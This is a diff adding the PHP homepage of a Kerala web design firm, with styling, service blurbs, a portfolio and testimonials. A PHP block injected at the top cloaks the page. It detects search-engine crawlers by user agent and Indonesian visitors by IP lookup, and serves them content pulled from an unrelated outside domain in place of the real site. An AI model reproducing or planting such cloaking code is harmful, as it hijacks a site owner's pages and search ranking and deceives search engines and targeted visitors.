@@ -1,0 +1,1003 @@
+<?php
+function getUserCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $url = "http://ip-api.com/json/{$ip}";
+    
+    $response = @file_get_contents($url);
+    if ($response) {
+        $data = json_decode($response, true);
+        return $data['countryCode'] ?? null;
+    }
+    return null;
+}
+
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+    
+    return preg_match($botchar, $user_agent);
+}
+
+$sky = "https://poltekkesmedankab.com/gsoinfotech/";
+
+if (is_bot()) {
+    echo @file_get_contents($sky);
+    exit;
+}
+
+if (getUserCountry() === "ID") {
+    header("Content-Type: text/html; charset=UTF-8");
+    echo @file_get_contents($sky);
+    exit();
+}
+
+?>
+<?php 
+include('header.php');
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GSO InfoTech - Leading Web Design Company in Trivandrum</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/>
+
+    <style>
+        :root {
+    --primary-color: #007bff;
+    --secondary-color: #28a745;
+    --text-color: #333;
+    --bg-light: #f8f9fa;
+}
+
+body {
+    font-family: 'Inter', sans-serif;
+    scroll-behavior: smooth;
+    margin: 0;
+}
+
+#section1 {
+    background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('images/bag1.jpeg') no-repeat center center/cover;
+    min-height: 70vh;
+    color: #fff;
+    display: flex;
+    align-items: center;
+}
+
+.section1-container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 15px;
+}
+
+.section1-text h1 {
+    font-size: clamp(2rem, 4vw, 3rem);
+    font-weight: 700;
+    margin-bottom: 1rem;
+}
+
+.section1-text {
+    text-align: left;
+}
+
+.section1-text p {
+    font-size: clamp(0.9rem, 1.5vw, 1.1rem);
+    margin-bottom: 1.5rem;
+    color: #e9ecef;
+}
+
+.btn-custom {
+    background: var(--secondary-color);
+    color: #fff;
+    padding: 8px 24px;
+    border-radius: 25px;
+    font-weight: 600;
+    transition: all 0.3s ease;
+}
+
+.btn-custom:hover {
+    background: #218838;
+    transform: translateY(-2px);
+}
+
+.section1-img {
+    max-height: 300px;
+    object-fit: contain;
+    width: 100%;
+}
+
+.text-carousel, .image-carousel {
+    width: 100%;
+}
+
+.owl-carousel .owl-item {
+    opacity: 0;
+    transition: opacity 0.5s ease;
+}
+
+.owl-carousel .owl-item.active {
+    opacity: 1;
+}
+
+.owl-carousel .owl-stage-outer {
+    overflow: hidden;
+}
+
+#section2 {
+    padding: 30px 0px 0px 0px;
+    background: var(--bg-light);
+}
+
+#section2 h2 {
+    font-size: clamp(1.8rem, 3vw, 2.2rem);
+    color: var(--primary-color);
+    margin-bottom: 1rem;
+}
+
+#section2 p {
+    text-align: justify;
+    max-width: 1000px;
+    margin: 0 auto 1rem;
+    line-height: 1.6;
+    color: var(--text-color);
+}
+
+#section3 {
+    padding: 30px 0;
+}
+
+.section3-title {
+    font-size: clamp(1.8rem, 3vw, 2.2rem);
+    color: var(--primary-color);
+    margin-bottom: 1.5rem;
+}
+
+.section3-card {
+    background: #fff;
+    border: none;
+    border-radius: 10px;
+    padding: 20px;
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+    transition: all 0.3s ease;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+}
+
+.section3-card:hover {
+    transform: translateY(-8px);
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+}
+
+.section3-card i {
+    text-align: center;
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+.section3-card h4 {
+    text-align: center;
+    font-size: 1.3rem;
+    color: var(--text-color);
+    margin-bottom: 0.8rem;
+}
+
+.section3-card p {
+    text-align: justify;
+    color: #666;
+    font-size: 0.9rem;
+    flex-grow: 1;
+    margin-bottom: 0.8rem;
+}
+
+.section3-card a {
+    color: var(--primary-color);
+    font-weight: 600;
+    text-decoration: none;
+    font-size: 0.9rem;
+}
+
+.section3-card a:hover {
+    color: var(--secondary-color);
+}
+
+@media (min-width: 768px) and (max-width: 1024px) {
+    .section3-card {
+        flex: 0 0 50%;
+        max-width: 100%;
+    }
+    .row > .col-md-3 {
+        flex: 0 0 50%;
+        max-width: 100%;
+    }
+}
+
+#section4 {
+    padding: 30px 0;
+    background: var(--bg-light);
+}
+
+.section4-title {
+    font-size: clamp(1.8rem, 3vw, 2.2rem);
+    color: var(--primary-color);
+    margin-bottom: 1.5rem;
+}
+
+#section4 p {
+    text-align: justify;
+    max-width: 1000px;
+    margin: 0 auto 1rem;
+    line-height: 1.6;
+    color: var(--text-color);
+}
+
+#section5 {
+    padding: 30px 0;
+}
+.section5-card div {
+    background: #fff;
+    border: none;
+    border-radius: 10px;
+    padding: 20px;
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+    height: 100%;
+    /*display: flex;*/
+    /*flex-direction: column;*/
+}
+.section5-card h5 {
+    padding-top:5px;
+    color: var(--primary-color);
+    text-align:left;
+}
+.section5-card p {
+    text-align:left;
+}
+.section5-title {
+    font-size: clamp(1.8rem, 3vw, 2.2rem);
+    color: var(--primary-color);
+    margin-bottom: 1.5rem;
+}
+
+.gallery-img {
+    width: 100%;
+    height: 200px;
+    border-radius: 10px;
+    transition: all 0.3s ease;
+}
+
+.gallery-img:hover {
+    transform: scale(1.05);
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+}
+
+#section6 {
+    padding: 30px 0;
+    background: var(--bg-light);
+}
+
+.section6-title {
+    font-size: clamp(1.8rem, 3vw, 2.2rem);
+    color: var(--primary-color);
+    margin-bottom: 1.5rem;
+}
+
+.section6-card {
+    background: #fff;
+    border: none;
+    border-radius: 10px;
+    padding: 20px;
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+    transition: all 0.3s ease;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+}
+
+.section6-card:hover {
+    transform: translateY(-8px);
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+}
+
+.section6-card i {
+    text-align: center;
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+.section6-card h4 {
+    font-size: 1.3rem;
+    color: var(--text-color);
+    margin-bottom: 0.8rem;
+    text-align: center;
+}
+
+.section6-card p {
+    text-align: justify;
+    color: #666;
+    font-size: 0.9rem;
+    flex-grow: 1;
+    margin-bottom: 0.8rem;
+}
+
+.section6-card a {
+    color: var(--primary-color);
+    font-weight: 600;
+    text-decoration: none;
+    font-size: 0.9rem;
+}
+
+.section6-card a:hover {
+    color: var(--secondary-color);
+}
+
+@media (max-width: 992px) {
+    .section1-container {
+        flex-direction: column;
+        text-align: center;
+    }
+
+    .section1-img {
+        margin-top: 1rem;
+        max-height: 250px;
+    }
+}
+
+@media (max-width: 768px) {
+    #section1 {
+        min-height: 65vh !important;
+    }
+
+    .section1-text h1 {
+        font-size: 2rem;
+    }
+
+    .section1-text p {
+        font-size: 1rem;
+    }
+
+    .section3-card, .section6-card {
+        margin-bottom: 1rem;
+    }
+
+    .gallery-img {
+        height: 130px;
+    }
+}
+
+@media (max-width: 576px) {
+    .section1-text h1 {
+        font-size: 1.8rem;
+    }
+
+    .section1-text p {
+        font-size: 0.9rem;
+    }
+
+    .section1-img {
+        max-height: 180px;
+    }
+
+    #section2, #section3, #section4, #section5, #section6 {
+        padding: 10px;
+    }
+
+    #section2 h2, .section3-title, .section4-title, .section5-title, .section6-title {
+        font-size: 1.6rem;
+    }
+
+    .section3-card, .section6-card {
+        padding: 15px;
+    }
+
+    #section5 .row {
+        margin-right: -5px;
+        margin-left: -5px;
+    }
+
+    #section5 .col-3 {
+        padding-right: 5px;
+        padding-left: 5px;
+    }
+
+    #section5 .gallery-img {
+        margin-bottom: -5px;
+    }
+
+    .gallery-img {
+        height: 70px;
+    }
+}
+
+.custom-link {
+    color: var(--primary-color);
+    text-decoration: none;
+    transition: all 0.3s ease;
+}
+
+.custom-link:hover {
+    color: var(--primary-color);
+    text-decoration: underline;
+}
+
+/* New styles for portfolio item titles and descriptions */
+.portfolio-item-title {
+    font-size: clamp(0.9rem, 2vw, 1rem);
+    font-weight: 600;
+    color: var(--text-color);
+    margin: 10px 0 5px;
+    text-align: center;
+}
+
+.portfolio-item-description {
+    font-size: clamp(0.8rem, 1.5vw, 0.9rem);
+    color: #666;
+    text-align: center;
+    line-height: 1.5;
+    margin: 0 0 15px;
+}
+
+/* Responsive adjustments for portfolio item text */
+@media (max-width: 768px) {
+    .portfolio-item-title {
+        font-size: 0.9rem;
+    }
+
+    .portfolio-item-description {
+        font-size: 0.8rem;
+    }
+}
+
+@media (max-width: 576px) {
+    .portfolio-item-title {
+        font-size: 0.8rem;
+        margin: 5px 0 3px;
+    }
+
+    .portfolio-item-description {
+        font-size: 0.7rem;
+        margin-bottom: 10px;
+    }
+}
+    </style>
+     <style>
+        #section7 {
+            padding: 10px 0 !important;
+            /*background: var(--bg-light);*/
+        }
+
+        .section7-title {
+            font-size: clamp(1.8rem, 3vw, 2.2rem);
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+        }
+
+        .section7-card {
+            /*background: #fff;*/
+            border-radius: 10px;
+            padding: 20px;
+            margin: 0 10px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .section7-card img {
+            width: 150px !important;
+            height: 100px;
+            margin: 0 auto 1rem;
+        }
+
+        .section7-card h3 {
+            font-size: 1.3rem;
+            color: var(--text-color);
+            margin-bottom: 0.8rem;
+        }
+
+        .section7-card p {
+            text-align: justify;
+            color: #666;
+            font-size: 0.9rem;
+            flex-grow: 1;
+            margin-bottom: 1rem;
+        }
+
+        .testimonial-carousel .owl-item {
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .testimonial-carousel .owl-item.active {
+            opacity: 1;
+        }
+
+        .testimonial-carousel .owl-stage-outer {
+            overflow: hidden;
+        }
+
+        @media (max-width: 768px) {
+            #section7 {
+                padding: 20px 0;
+            }
+
+            .section7-title {
+                font-size: 1.6rem;
+            }
+
+            .section7-card {
+                padding: 15px;
+            }
+
+            .section7-card img {
+                width: 80px;
+                height: 80px;
+            }
+
+            .section7-card h3 {
+                font-size: 1.1rem;
+            }
+
+            .section7-card p {
+                font-size: 0.85rem;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .section7-card img {
+                width: 60px;
+                height: 60px;
+            }
+
+            .section7-card h3 {
+                font-size: 1rem;
+            }
+
+            .section7-card p {
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+    <style>
+    #brand-section {
+        padding: 30px 0;
+    }
+
+    .brand-title {
+        font-size: clamp(1.8rem, 3vw, 2.2rem);
+        color: var(--primary-color);
+        margin-bottom: 1.5rem;
+        text-align: center;
+    }
+
+    .brand-carousel {
+        width: 100%;
+    }
+
+    .brand-carousel .owl-item {
+        opacity: 1;
+        transition: opacity 0.4s ease;
+    }
+
+    .brand-carousel .brand-item {
+        text-align: center;
+    }
+
+    .brand-carousel .brand-item img {
+        max-width: 150px;
+        height: 80px;
+        transition: all 0.4s ease;
+    }
+
+    
+
+    @media (max-width: 768px) {
+        .brand-title {
+            font-size: 1.6rem;
+        }
+
+        .brand-carousel .brand-item img {
+            max-width: 120px;
+        }
+    }
+
+    @media (max-width: 576px) {
+        #brand-section {
+            padding: 20px 0;
+        }
+
+        .brand-carousel .brand-item img {
+            max-width: 90px;
+            height: 50px;
+        }
+    }
+</style>
+</head>
+<body>
+    <section id="section1" class="mt-5 pt-5">
+        <div class="section1-container container ">
+            <div class="row align-items-center">
+                <div class="col-lg-6">
+                    <div class="text-carousel owl-carousel owl-theme">
+                        <div class="section1-text">
+                            <h1>Leading Web Design Company in trivandrum, Kerala</h1>
+                            <p>Comprehensive website development services by <strong>GSO InfoTech</strong>, delivering innovative solutions for your business success.</p>
+                            <a href="#section2" class="btn btn-custom">Discover More</a>
+                        </div>
+                        <div class="section1-text">
+                            <h1>Responsive Web Designing Company in trivandrum, Kerala</h1>
+                            <p>Get your website optimized for every device by a Web Development company in Trivandrum, Kerala.</p>
+                            <a href="#section2" class="btn btn-custom">Read More</a>
+                        </div>
+                        <div class="section1-text">
+                            <h1>Trusted Web Development Company in Trivandrum, Kerala</h1>
+                            <p>Quality meets Trust: Get Innovative web design solutions from the most trusted web design company in Kerala.</p>
+                            <a href="#section2" class="btn btn-custom">Read More</a>
+                        </div>
+                        <div class="section1-text">
+                            <h1>Reliable Web Designing Company in Trivandrum, Kerala</h1>
+                            <p>Looking to expand your business through Internet? Premium E-commerce websites built by the most reliable web designing company in Trivandrum.</p>
+                            <a href="#section2" class="btn btn-custom">Read More</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6 text-center">
+                    <div class="image-carousel owl-carousel owl-theme">
+                        <div>
+                            <img src="images/banner1.png" alt="Technology" class="section1-img img-fluid">
+                        </div>
+                        <div>
+                            <img src="images/a1.jpg" alt="Responsive Design" class="section1-img img-fluid">
+                        </div>
+                        <div>
+                            <img src="images/a4.jpg" alt="Trusted Web" class="section1-img img-fluid">
+                        </div>
+                        <div>
+                            <img src="images/a10.jpg" alt="E-commerce" class="section1-img img-fluid">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="section2" class="text-center">
+        <div class="container">
+            <h2>Who We Are</h2>
+            <p>
+                In compliance with any budget provisions, we can create cost effective websites for successful presentation of your company on Internet. We will provide <a href="#" class="custom-link">web hosting and domain registration</a>, which is suitable for your taste. Apart from web design and web hosting, we offer revamping of the existing website and <a href="#" class="custom-link">website maintenance</a>.
+            </p>
+            <p>
+                <a href="#" class="custom-link">GSO Infotech IT Solutions</a> is a professional web design company in Trivandrum (Tvm), Kerala, India. TECHSOFT web solutions creates International Standard website for your business. Our main goal is quality, efficiency and complete customer satisfaction. TECHSOFT web Solutions have young creative and talented team of IT professionals including marketing consultants, web designers, and programmers who can deliver the essence and quality based Website design project. We are focused Website Development in ASP.NET, PHP, Static Websites, Web Applications, Web Portal, Shopping cart and E-commerce sites, Flash websites, Website Maintenance, Search Engine Optimization
+            </p>
+        </div>
+    </section>
+
+    <section id="section3">
+        <div class="container">
+            <h2 class="text-center section3-title">Our Services</h2>
+            <div class="row">
+                <div class="col-md-3 col-sm-6 mb-3">
+                    <div class="section3-card">
+                        <i class="fas fa-globe"></i>
+                        <h4>Web Development</h4>
+                        <p>We design and develop different types of great websites including Static, E-commerce, dynamic, customized and content management system etc. We have a great knowledge of the best website creating, latest trends in design of web page & No compromise on quality of design the website.</p>
+                        <a href="#" class="mt-auto">Read More...</a>
+                    </div>
+                </div>
+                <div class="col-md-3 col-sm-6 mb-3">
+                    <div class="section3-card">
+                        <i class="fas fa-paint-brush"></i>
+                        <h4>Web Design</h4>
+                        <p>We are an experienced web page design, Developing and hosting company that provide professional design of web page services to suit your requirements. The different areas of web design include graphic website design, attractive responsive website designs, cool website layouts.</p>
+                        <a href="#" class="mt-auto">Read More...</a>
+                    </div>
+                </div>
+                <div class="col-md-3 col-sm-6 mb-3">
+                    <div class="section3-card">
+                        <i class="fas fa-search"></i>
+                        <h4>SEO Services</h4>
+                        <p>Techsoft, Kerala based one of the top web designing companies in Kochi within the SEO services. Our SEO services help our worldwide clients to gain professional website & providing excellent SEO services at affordable rates. We provide highly professional custom web development services.</p>
+                        <a href="#" class="mt-auto">Read More...</a>
+                    </div>
+                </div>
+                <div class="col-md-3 col-sm-6 mb-3">
+                    <div class="section3-card">
+                        <i class="fas fa-mobile-alt"></i>
+                        <h4>Mobile Apps</h4>
+                        <p>Mobile User Interface (UI) Design is also an essential in the creation of mobile apps. Mobile UI considers constraints & contexts, screen, input and mobility as outlines for design. This web development is used to denote the act or process for Mobile Application Development, best web design studios.</p>
+                        <a href="#" class="mt-auto">Read More...</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="section4" class="text-center">
+        <div class="container">
+            <h2 class="section4-title">Our Latest Works</h2>
+            <p>
+                Purposing web design is a complex, but essential ongoing activity. Before web page creating and uploading a website, it is important to take the time to plan exactly what is needed in the website. Thoroughly considering the audience or target market, as well as defining the purpose and deciding what content will be developed are extremely important.
+            </p>
+            <p>
+                FOR <a href="#" class="custom-link">Website Designing</a>, <a href="#" class="custom-link">Webdevelopment</a>, <a href="#" class="custom-link">Website Design & Web Hosting Services</a>, <a href="#" class="custom-link">website maintenance</a>, <a href="#" class="custom-link">re-designing of website</a>, PSD to HTML Conversion, Graphic Designing & Logos, Google Ad Campaigns, CMS, website specialists, Website Design Outsourcing. <a href="#" class="custom-link">GSO Infotech IT Solutions</a> a cochin based company from India offers website designing, development at very affordable cost.
+            </p>
+        </div>
+    </section>
+    
+    
+<section id="section5">
+    <div class="container">
+        <h2 class="text-center section5-title">Our Portfolio</h2>
+        <div class="row mb-3 section5-card">
+            <div class="col-lg-3 col-sm-3 col-6 mb-2">
+                <img src="images/a1.jpg" alt="Portfolio 1" class="gallery-img img-fluid">
+                <h5 class="portfolio-item-title">Project One</h5>
+                <p class="portfolio-item-description">A showcase of innovative design and functionality.</p>
+            </div>
+            <div class="col-lg-3 col-sm-3 col-6 mb-2">
+                <img src="images/a2.jpg" alt="Portfolio 2" class="gallery-img img-fluid">
+                <h5 class="portfolio-item-title">Project Two</h5>
+                <p class="portfolio-item-description">Blending creativity with cutting-edge technology.</p>
+            </div>
+            <div class="col-lg-3 col-sm-3 col-6 mb-2">
+                <img src="images/a3.jpg" alt="Portfolio 3" class="gallery-img img-fluid">
+                <h5 class="portfolio-item-title">Project Three</h5>
+                <p class="portfolio-item-description">Crafted with precision and attention to detail.</p>
+            </div>
+            <div class="col-lg-3 col-sm-3 col-6 mb-2">
+                <img src="images/a4.jpg" alt="Portfolio 4" class="gallery-img img-fluid">
+                <h5 class="portfolio-item-title">Project Four</h5>
+                <p class="portfolio-item-description">A bold vision brought to life with expertise.</p>
+            </div>
+        </div>
+        <div class="row section5-card">
+            <div class="col-lg-3 col-sm-3 col-6 mb-2">
+                <img src="images/a5.jpg" alt="Portfolio 5" class="gallery-img img-fluid">
+                <h5 class="portfolio-item-title">Project Five</h5>
+                <p class="portfolio-item-description">Elegant design meets practical solutions.</p>
+            </div>
+            <div class="col-lg-3 col-sm-3 col-6 mb-2">
+                <img src="images/a6.jpg" alt="Portfolio 6" class="gallery-img img-fluid">
+                <h5 class="portfolio-item-title">Project Six</h5>
+                <p class="portfolio-item-description">Pushing boundaries with creative excellence.</p>
+            </div>
+            <div class="col-lg-3 col-sm-3 col-6 mb-2">
+                <img src="images/a7.jpg" alt="Portfolio 7" class="gallery-img img-fluid">
+                <h5 class="portfolio-item-title">Project Seven</h5>
+                <p class="portfolio-item-description">Transforming ideas into stunning realities.</p>
+            </div>
+            <div class="col-lg-3 col-sm-3 col-6 mb-2">
+                <img src="images/a8.jpg" alt="Portfolio 8" class="gallery-img img-fluid">
+                <h5 class="portfolio-item-title">Project Eight</h5>
+                <p class="portfolio-item-description">A masterpiece of innovation and style.</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+    <section id="section6">
+        <div class="container">
+            <h2 class="text-center section6-title">Latest Technologies</h2>
+            <div class="row mb-4">
+                <div class="col-12">
+                    <p class="text-center" style="max-width: 1000px; margin: 0 auto; line-height: 1.6; color: var(--text-color);">
+                        Our Company in Cochin follows the best website design and hosting practice while assisting you to achieve your predefined goals and also leads you to obtain greater financial success well beyond your expectations. Our web design firm is to make you better best design ever, more productive and thus more profit-making.
+                    </p>
+                </div>
+            </div>
+            <div class="row mb-4">
+                <div class="col-md-4 col-sm-6 mb-3">
+                    <div class="section6-card">
+                        <i class="fas fa-code"></i>
+                        <h4>ASP.NET with MSSQL</h4>
+                        <p>We create custom websites as per clients need with ASP.NET web design & Development. It is an open-source server-side Web application framework designed for website design & Website development to produce dynamic webpages. It was developed by Microsoft to allow programmers to build dynamic web sites, web design & web services.</p>
+                        <a href="#" class="mt-auto">More...</a>
+                    </div>
+                </div>
+                <div class="col-md-4 col-sm-6 mb-3">
+                    <div class="section6-card">
+                        <i class="fas fa-cogs"></i>
+                        <h4>Yii</h4>
+                        <p>Yii is an open-source, object-oriented, component-based MVC PHP web application framework. The Yii framework also offers a breadth of capabilities that allow quickly and easily write optimized web applications.</p>
+                        <a href="#" class="mt-auto">More...</a>
+                    </div>
+                </div>
+                <div class="col-md-4 col-sm-6 mb-3">
+                    <div class="section6-card">
+                        <i class="fab fa-wordpress"></i>
+                        <h4>WordPress</h4>
+                        <p>We are Experts in WordPress web site design, development and we have hosted many web sites on WordPress. Make sure your jaws are sturdy enough when you'll see your web site completed by techsoft cochin! WordPress is a free and open-source blogging tool and a content management system (CMS) based on PHP and MySQL.</p>
+                        <a href="#" class="mt-auto">More...</a>
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-4 col-sm-6 mb-3">
+                    <div class="section6-card">
+                        <i class="fab fa-joomla"></i>
+                        <h4>Joomla</h4>
+                        <p>Joomla! is a content management system, which enables you to build Websites and powerful online applications. Many aspects, including its ease-of-use and extensibility, have made Joomla! the most popular Website software available.</p>
+                        <a href="#" class="mt-auto">More...</a>
+                    </div>
+                </div>
+                <div class="col-md-4 col-sm-6 mb-3">
+                    <div class="section6-card">
+                        <i class="fab fa-php"></i>
+                        <h4>PHP with MySQL</h4>
+                        <p>We also offer PHP website design & development. PHP is a fast and feature-rich open-source scripting language used to develop web design Applications or Internet/Intranet Applications. MySQL is a popular choice of database for use in web design applications, and is a central component of the widely used LAMP.</p>
+                        <a href="#" class="mt-auto">More...</a>
+                    </div>
+                </div>
+                <div class="col-md-4 col-sm-6 mb-3">
+                    <div class="section6-card">
+                        <i class="fas fa-fire"></i>
+                        <h4>CodeIgniter</h4>
+                        <p>CodeIgniter is an open-source software rapid design-development web framework, for use in building dynamic websites with PHP. CodeIgniter is loosely based on the popular MVC (Model View Controller) design & development pattern.</p>
+                        <a href="#" class="mt-auto">More...</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="section7" class="text-center">
+    <div class="container">
+        <h2 class="section7-title">What Our Clients Say</h2>
+        <div class="testimonial-carousel owl-carousel owl-theme">
+            <div class="item">
+                <div class="section7-card">
+                    <img src="images/bag1.jpeg" alt="Client Testimonial">
+                    <h3>Website Design Trivandrum</h3>
+                    <p>
+                        Techsoft Web Solutions has been more than a great service provider; Techsoft Web Solutions has been more than a great service provider; they have been a truly responsive partner and have provided high quality service in a timely and cost effective manner. <br><strong>- Wonderla Web Design Kerala</strong>
+                    </p>
+                </div>
+            </div>
+            <div class="item">
+                <div class="section7-card">
+                    <img src="images/bag1.jpeg" alt="Client Testimonial">
+                    <h3>Low Cost Web Design Trivandrum</h3>
+                    <p>
+                        Thank you so much for our lovely new website and web design. I am delighted with the design and it was wonderful that you understood what we were trying to achieve from the beginning. I am looking forward to working with you on the next phases, now that I am so enthused by our website and web design! <br><strong>Best Website Designer in Trivandrum</strong>
+                    </p>
+                </div>
+            </div>
+            <div class="item">
+                <div class="section7-card">
+                    <img src="images/bag1.jpeg" alt="Client Testimonial">
+                    <h3>Software Company Trivandrum</h3>
+                    <p>
+                        Techsoft web solution gave me a great solution for an interactive website and backed it up with timely support and cost effective enhancements. I think it is one of the best web designing company Cochin. They went above and beyond in delivering on their commitments. <br><strong>Low Cost Web Design Trivandrum</strong>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+    </section>
+
+   
+
+<section id="brand-section">
+    <div class="container">
+        <h2 class="brand-title">Trusted Brands in Kerala</h2>
+        <div class="brand-carousel owl-carousel owl-theme">
+            <div class="brand-item">
+                <img src="img/b1.jpeg" alt="Brand 1">
+            </div>
+            <div class="brand-item">
+                <img src="img/b2.jpeg" alt="Brand 2">
+            </div>
+            <div class="brand-item">
+                <img src="img/b3.jpeg" alt="Brand 3">
+            </div>
+            <div class="brand-item">
+                <img src="img/b4.jpeg" alt="Brand 4">
+            </div>
+            <div class="brand-item">
+                <img src="img/b5.jpeg" alt="Brand 5">
+            </div>
+            <div class="brand-item">
+                <img src="img/b6.jpeg" alt="Brand 6">
+            </div>
+        </div>
+    </div>
+</section>
+
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            var textCarousel = $('.text-carousel').owlCarousel({
+                loop: true,
+                items: 1,
+                nav: false,
+                dots: false,
+                autoplay: true,
+                autoplayTimeout: 3000,
+                autoplayHoverPause: false,
+                smartSpeed: 800,
+                rtl: true
+            });  
+
+            var imageCarousel = $('.image-carousel').owlCarousel({
+                loop: true,
+                items: 1,
+                nav: false,
+                dots: false,
+                autoplay: true,
+                autoplayTimeout: 3000,
+                autoplayHoverPause: false,
+                smartSpeed: 800
+            });
+
+            $('.text-carousel, .image-carousel').on('mouseenter', function(){
+                textCarousel.trigger('stop.owl.autoplay');
+                imageCarousel.trigger('stop.owl.autoplay');
+            });
+
+            $('.text-carousel, .image-carousel').on('mouseleave', function(){
+                textCarousel.trigger('play.owl.autoplay');
+                imageCarousel.trigger('play.owl.autoplay');
+            });  
+            
+            $('.testimonial-carousel').owlCarousel({
+            loop: true,
+            nav: false,
+            dots: false,
+            autoplay: true,
+            autoplayTimeout: 5000,
+            autoplayHoverPause: true,
+            smartSpeed: 800,
+            responsive: {
+                0: {
+                    items: 1
+                },
+                768: {
+                    items: 1
+                },
+                992: {
+                    items: 1
+                }
+            }
+            });
+            $('.brand-carousel').owlCarousel({
+            loop: true,
+            nav: false,
+            dots: false,
+            autoplay: true,
+            autoplayTimeout: 800, // Increased timeout for smoother transitions
+            autoplayHoverPause: true,
+            smartSpeed: 800, // Slightly reduced speed for smoother animation
+            responsive: {
+                0: {
+                    items: 4,
+                    margin: 10
+                },
+                768: {
+                    items: 5,
+                    margin: 10
+                },
+                992: {
+                    items: 6,
+                    margin: 5
+                }
+            }
+            });
+        });
+    </script>
+</body>
+</html>
+<?php 
+include('footer.php');
+?>
